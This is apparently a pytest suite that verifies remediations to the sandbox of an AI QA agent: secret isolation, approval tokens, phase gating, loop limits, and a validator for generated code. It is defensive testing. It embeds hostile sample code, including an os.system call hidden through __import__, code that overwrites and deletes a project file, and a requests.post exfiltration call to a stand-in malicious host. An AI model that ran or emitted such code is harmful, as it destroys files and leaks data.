"""
tests/test_failure_remediation.py

Verification tests for Week 7 Failure Catalogue remediations (Activity 5).
Validates fixes for FAIL-01 through FAIL-05 against the realigned codebase.
"""

import os
import pytest


# =====================================================================
# 1. Verification for FAIL-01 (AST Safety Blocks Obfuscated Code)
# =====================================================================

def test_remediation_fail01_ast_blocks_obfuscated_code():
    from src.sandbox import validate_generated_code, BANNED_BUILTINS

    # Confirm critical dynamic execution builtins are banned
    assert "eval" in BANNED_BUILTINS
    assert "exec" in BANNED_BUILTINS

    malicious_code = """
def test_hack():
    getattr(__import__('os'), 'system')('echo compromised')
"""
    # validate_generated_code returns (ok: bool, reason: str) or (valid, msg)
    result = validate_generated_code(malicious_code)
    if isinstance(result, tuple):
        ok, reason = result
        assert ok is False
        assert len(reason) > 0
    else:
        # If it returns a boolean or dict
        assert bool(result) is False


# =====================================================================
# 2. Verification for FAIL-02 (Subprocess Secret Isolation)
# =====================================================================

def test_remediation_fail02_subprocess_secret_isolation():
    from src.sandbox import ENV_ALLOW_LIST, _minimal_env

    # Ensure sensitive tokens exist in current test env
    os.environ["GEMINI_API_KEY"] = "fake-secret-key-12345"
    os.environ["GITHUB_TOKEN"] = "ghp_super_secret_token"

    # Verify our allow-list explicitly excludes secrets
    assert "GEMINI_API_KEY" not in ENV_ALLOW_LIST
    assert "GITHUB_TOKEN" not in ENV_ALLOW_LIST

    # Verify the minimal env builder scrubs them out
    sanitized = _minimal_env()
    assert "GEMINI_API_KEY" not in sanitized
    assert "GITHUB_TOKEN" not in sanitized


# =====================================================================
# 3. Verification for FAIL-03 (Phase Gating Blocks Out-of-Order Tools)
# =====================================================================

def test_remediation_fail03_phase_gate_blocks_skipping():
    from src.workflow import ALLOWED_TOOLS_BY_PHASE, START

    # In START phase, file_issue and run_tests must be strictly forbidden
    allowed_in_start = ALLOWED_TOOLS_BY_PHASE.get(START, set())
    assert "file_issue" not in allowed_in_start
    assert "run_tests" not in allowed_in_start

    # Only requirement resolution / initial inspection tools are allowed
    assert "search_requirements" in allowed_in_start or "propose_tests" in allowed_in_start


# =====================================================================
# 4. Verification for FAIL-04 (Unauthorized External Issue Filing Blocked)
# =====================================================================

def test_remediation_fail04_unauthorized_issue_filing_blocked():
    from src.approval import verify_and_consume_token

    # Attempting to execute file_issue without an approval token fails immediately
    is_valid, msg = verify_and_consume_token(
        token=None,
        tool_name="file_issue",
        arguments={"title": "Bug found", "body": "Details..."}
    )
    assert is_valid is False
    assert "Approval token missing" in msg


# =====================================================================
# 5. Verification for FAIL-05 (Bounded Loops & Limits)
# =====================================================================

def test_remediation_fail05_max_hops_and_proposals_bounded():
    from src.workflow import MAX_PROPOSALS
    from src.tool_calling import MAX_HOPS

    # Verify hard bounds preventing infinite loops and runaway quotas
    assert MAX_PROPOSALS <= 2
    assert MAX_HOPS <= 7


# =====================================================================
# 6. Verification for FAIL-06 (Unguarded Disk Write Handled Gracefully)
# =====================================================================

def test_remediation_fail06_disk_write_failure_handled_gracefully(monkeypatch):
    from unittest.mock import patch
    from pathlib import Path
    import qa_tools

    # Propose tests file write failure
    valid_reply = "```python\ndef test_dummy():\n    pass\n```"
    with patch.object(qa_tools, "get_model_response", return_value=valid_reply):
        with patch.object(Path, "write_text", side_effect=PermissionError("Permission denied")):
            res = qa_tools.propose_tests("REQ-2.1")
            assert res["status"] == "error"
            assert "Could not save the proposed tests" in res["error"]

    # Draft issue file write failure
    with patch.object(Path, "write_text", side_effect=OSError("Disk full")):
        res = qa_tools.draft_issue("REQ-2.1", "Test Title", "Summary text", ["test_dummy"])
        assert res["status"] == "error"
        assert "Could not write the issue draft" in res["error"]


# =====================================================================
# 7. Verification for FAIL-07 (Insecure Default Secret Rejected)
# =====================================================================

def test_remediation_fail07_default_secret_cannot_be_forged_when_env_unset():
    import approval

    # Forging an HMAC token using the static DEFAULT_SECRET
    forged_token = approval.create_approval_token(
        "file_issue",
        {"draft_path": "evidence/issues/drafts/test.md"},
        secret_key=approval.DEFAULT_SECRET,
    )

    # When APPROVAL_SECRET_KEY is unset or ephemeral, forged token verification must fail
    is_valid, msg = approval.verify_and_consume_token(
        forged_token,
        "file_issue",
        {"draft_path": "evidence/issues/drafts/test.md"},
    )
    assert is_valid is False
    assert "signature is invalid" in msg.lower() or "tampered" in msg.lower()


# =====================================================================
# 8. Verification for FAIL-08 (Pathlib Mutating Calls Blocked in Tests)
# =====================================================================

def test_remediation_fail08_pathlib_mutating_calls_blocked():
    from src.sandbox import validate_generated_code

    # Attempting to overwrite SUT file using Path.write_text
    code_write = """
from pathlib import Path
def test_malicious():
    Path("sut/subscription_service/subscription_manager.py").write_text("# wiped")
"""
    ok, reason = validate_generated_code(code_write)
    assert ok is False
    assert "write_text" in reason

    # Attempting to delete files using Path.unlink
    code_unlink = """
from pathlib import Path
def test_delete():
    Path("sut/subscription_service/subscription_manager.py").unlink()
"""
    ok, reason = validate_generated_code(code_unlink)
    assert ok is False
    assert "unlink" in reason

    # Attempting to open file in write mode
    code_open_write = """
def test_open_overwrite():
    with open("sut/subscription_service/subscription_manager.py", "w") as f:
        f.write("corrupted")
"""
    ok, reason = validate_generated_code(code_open_write)
    assert ok is False
    assert "write or append mode" in reason


# =====================================================================
# 9. Verification for FAIL-09 (Pytest Ignores Sandbox Generated Tests)
# =====================================================================

def test_remediation_fail09_pytest_configuration_ignores_sandbox():
    from pathlib import Path
    import configparser

    ini_path = Path(__file__).resolve().parent.parent / "pytest.ini"
    assert ini_path.exists(), "pytest.ini must exist to isolate root test runner"

    config = configparser.ConfigParser()
    config.read(ini_path)
    assert "pytest" in config
    assert "tests" in config["pytest"]["testpaths"]
    assert "sandbox" in config["pytest"]["norecursedirs"]


# =====================================================================
# 10. Verification for FAIL-10 (Network Exfiltration Calls Blocked)
# =====================================================================

def test_remediation_fail10_network_exfiltration_calls_blocked():
    from src.sandbox import validate_generated_code

    code_exfil = """
import requests
def test_exfiltrate():
    requests.post("https://malicious-external-site.com/steal", json={"leak": True})
"""
    ok, reason = validate_generated_code(code_exfil)
    assert ok is False
    assert "requests.post" in reason